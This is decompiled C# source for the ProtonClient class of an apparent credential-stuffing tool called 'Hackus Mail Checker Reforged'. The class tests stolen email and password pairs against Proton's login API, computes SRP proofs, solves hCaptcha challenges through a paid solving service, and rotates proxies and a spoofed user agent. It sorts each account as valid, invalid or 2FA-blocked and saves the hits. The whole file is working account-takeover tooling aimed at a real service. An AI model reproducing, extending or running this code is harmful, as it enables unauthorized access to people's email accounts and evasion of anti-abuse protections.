using System;
using System.Text.RegularExpressions;
using System.Threading;
using Hackus_Mail_Checker_Reforged.Helpers;
using Hackus_Mail_Checker_Reforged.Models;
using Hackus_Mail_Checker_Reforged.Models.Enums;
using Hackus_Mail_Checker_Reforged.Net.Web.Proton;
using Hackus_Mail_Checker_Reforged.Net.Web.Proton.GoSrp;
using Hackus_Mail_Checker_Reforged.Services.Managers;
using Hackus_Mail_Checker_Reforged.Services.Settings;
using Newtonsoft.Json;
using xNet;

namespace Hackus_Mail_Checker_Reforged.Net
{
	// Token: 0x020000AB RID: 171
	public class ProtonClient
	{
		// Token: 0x17000135 RID: 309
		// (get) Token: 0x06000572 RID: 1394 RVA: 0x00006D62 File Offset: 0x00004F62
		private SearchSettings SearchSettings
		{
			get
			{
				return SearchSettings.Instance;
			}
		}

		// Token: 0x06000573 RID: 1395 RVA: 0x00009BD9 File Offset: 0x00007DD9
		public ProtonClient(Mailbox mailbox)
		{
			this._mailbox = mailbox;
		}

		// Token: 0x06000574 RID: 1396 RVA: 0x00021724 File Offset: 0x0001F924
		public void Handle()
		{
			if (this._mailbox.Address == null)
			{
				return;
			}
			OperationResult operationResult = this.Login();
			StatisticsManager.Instance.Increment(operationResult);
			FileManager.SaveStatistics(this._mailbox.Address, this._mailbox.Password, operationResult);
			if (operationResult == OperationResult.Ok && !SearchSettings.Instance.Search)
			{
				MailManager.Instance.AddResult(new MailboxResult(this._mailbox));
			}
		}

		// Token: 0x06000575 RID: 1397 RVA: 0x00021794 File Offset: 0x0001F994
		private OperationResult Login()
		{
			int num = 0;
			for (;;)
			{
				this.Reset();
				OperationResult operationResult = this.GetAuthInfo();
				if (operationResult == OperationResult.Error)
				{
					return operationResult;
				}
				if (operationResult != OperationResult.HttpError)
				{
					operationResult = this.Authenticate(null);
					if (operationResult == OperationResult.Captcha)
					{
						if (WebSettings.Instance.SolveCaptcha && !string.IsNullOrEmpty(WebSettings.Instance.CaptchaSolvationKey))
						{
							OperationResult siteKey = this.GetSiteKey();
							if (siteKey == OperationResult.Error)
							{
								return OperationResult.Captcha;
							}
							if (siteKey == OperationResult.HttpError)
							{
								continue;
							}
							ValueTuple<OperationResult, string> valueTuple = CaptchaHelpers.CreateInstance().SolveHCaptcha(this._siteKey, "https://account.proton.me/login", "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) GSA/50.0.197507736 Mobile/17D50 Safari/604.1");
							OperationResult item = valueTuple.Item1;
							string item2 = valueTuple.Item2;
							if (item == OperationResult.Error)
							{
								break;
							}
							if (item == OperationResult.HttpError)
							{
								continue;
							}
							operationResult = this.Authenticate(item2);
						}
						else
						{
							if (num <= 3)
							{
								num++;
								continue;
							}
							return OperationResult.Captcha;
						}
					}
					if (operationResult != OperationResult.HttpError)
					{
						return operationResult;
					}
				}
			}
			return OperationResult.Captcha;
		}

		// Token: 0x06000576 RID: 1398 RVA: 0x00021868 File Offset: 0x0001FA68
		private OperationResult GetAuthInfo()
		{
			this.WaitPause();
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					httpRequest.AddHeader("Accept", "application/vnd.protonmail.v1+json");
					httpRequest.AddHeader("x-pm-appversion", "WebVPNSettings_4.7.0");
					httpRequest.AddHeader("x-pm-apiversion", "3");
					httpRequest.AddHeader("x-pm-locale", "en_US");
					string text = "{\"Username\":\"" + this._mailbox.Address + "\"}";
					string input = httpRequest.Post("https://account.proton.me/api/auth/info", text, "application/json").ToString();
					Match match = Regex.Match(input, "\"Modulus\":\"(.+?)\"");
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					this._modulus = match.Groups[1].Value.Replace("\\n", "");
					match = Regex.Match(input, "\"SRPSession\":\"(.+?)\"");
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					this._srpSession = match.Groups[1].Value;
					match = Regex.Match(input, "\"Salt\":\"(.+?)\"");
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					this._salt = match.Groups[1].Value;
					match = Regex.Match(input, "\"ServerEphemeral\":\"(.+?)\"");
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					this._serverEphemeral = match.Groups[1].Value;
					this._goProofs = GoSrpInvoker.GenerateProofs(4, this._mailbox.Address, this._mailbox.Password, this._salt, this._modulus, this._serverEphemeral, 2048);
					if (this._goProofs == null)
					{
						return OperationResult.Error;
					}
					return OperationResult.Ok;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x06000577 RID: 1399 RVA: 0x00021ADC File Offset: 0x0001FCDC
		private OperationResult Authenticate(string token = null)
		{
			this.WaitPause();
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					httpRequest.AddHeader("Accept", "application/vnd.protonmail.v1+json");
					httpRequest.AddHeader("x-pm-appversion", "WebVPNSettings_4.7.0");
					httpRequest.AddHeader("x-pm-apiversion", "3");
					httpRequest.AddHeader("x-pm-locale", "en_US");
					if (token != null)
					{
						httpRequest.AddHeader("x-pm-human-verification-token-type", "captcha");
						httpRequest.AddHeader("x-pm-human-verification-token", this._humanVerificationToken + ":" + this._sendToken + token);
					}
					string text = JsonConvert.SerializeObject(new
					{
						ClientEphemeral = this._goProofs.ClientEphemeral,
						ClientProof = this._goProofs.ClientProof,
						SRPSession = this._srpSession,
						Username = this._mailbox.Address
					});
					string text2 = httpRequest.Post("https://account.proton.me/api/auth", text, "application/json").ToString();
					if (text2.Contains("HumanVerificationToken"))
					{
						Match match = Regex.Match(text2, "\"HumanVerificationToken\":\"(.+?)\"");
						if (match.Success)
						{
							this._humanVerificationToken = match.Groups[1].Value;
						}
						return OperationResult.Captcha;
					}
					if (text2.ContainsOne(new string[]
					{
						"Incorrect login credentials",
						"\"Code\":2000,"
					}))
					{
						return OperationResult.Bad;
					}
					if (text2.ContainsOne(new string[]
					{
						"\"Code\":10001,",
						"\"Code\":10003,",
						"\"2FA\":{\"Enabled\":1",
						"\"TwoFactor\":1",
						"\"TOTP\":1"
					}))
					{
						return OperationResult.Blocked;
					}
					if (!text2.ContainsOne(new string[]
					{
						"\"Code\":1000,",
						"\"Uid\":\"",
						"\"UID\":"
					}))
					{
						return OperationResult.Error;
					}
					return OperationResult.Ok;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x06000578 RID: 1400 RVA: 0x00021D70 File Offset: 0x0001FF70
		private OperationResult GetSiteKey()
		{
			this.WaitPause();
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					httpRequest.AddUrlParam("Token", this._humanVerificationToken);
					httpRequest.AddUrlParam("ForceWebMessaging", 1);
					string input = httpRequest.Get("https://account-api.proton.me/core/v4/captcha", null).ToString();
					Match match = Regex.Match(input, "publicKey = \"(.+?)\"");
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					this._siteKey = match.Groups[1].Value;
					match = Regex.Match(input, "sendToken\\(\\'(.+?)\\'\\+\\'(.+?)\\'");
					if (match.Success)
					{
						this._sendToken = match.Groups[1].Value + match.Groups[2].Value;
						return OperationResult.Ok;
					}
					return OperationResult.Error;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x06000579 RID: 1401 RVA: 0x00021E94 File Offset: 0x00020094
		private void SetHeaders(HttpRequest request)
		{
			request.IgnoreProtocolErrors = true;
			request.ConnectTimeout = CheckerSettings.Instance.Timeout * 1000;
			request.Cookies = this._cookies;
			request.Proxy = this._proxyClient;
			request.UserAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) GSA/50.0.197507736 Mobile/17D50 Safari/604.1";
		}

		// Token: 0x0600057A RID: 1402 RVA: 0x00009BE8 File Offset: 0x00007DE8
		private void Reset()
		{
			this._cookies = new CookieDictionary(false);
			if (ProxySettings.Instance.UseProxy)
			{
				this._proxyClient = ProxyManager.Instance.GetProxy();
			}
		}

		// Token: 0x0600057B RID: 1403 RVA: 0x00009AC8 File Offset: 0x00007CC8
		private void WaitPause()
		{
			ThreadsManager.Instance.WaitHandle.WaitOne();
		}

		// Token: 0x040002DC RID: 732
		private Mailbox _mailbox;

		// Token: 0x040002DD RID: 733
		private ProxyClient _proxyClient;

		// Token: 0x040002DE RID: 734
		private CookieDictionary _cookies;

		// Token: 0x040002DF RID: 735
		private string _modulus;

		// Token: 0x040002E0 RID: 736
		private string _srpSession;

		// Token: 0x040002E1 RID: 737
		private string _salt;

		// Token: 0x040002E2 RID: 738
		private string _serverEphemeral;

		// Token: 0x040002E3 RID: 739
		private GoProofs _goProofs;

		// Token: 0x040002E4 RID: 740
		private string _humanVerificationToken;

		// Token: 0x040002E5 RID: 741
		private string _siteKey;

		// Token: 0x040002E6 RID: 742
		private string _sendToken;
	}
}
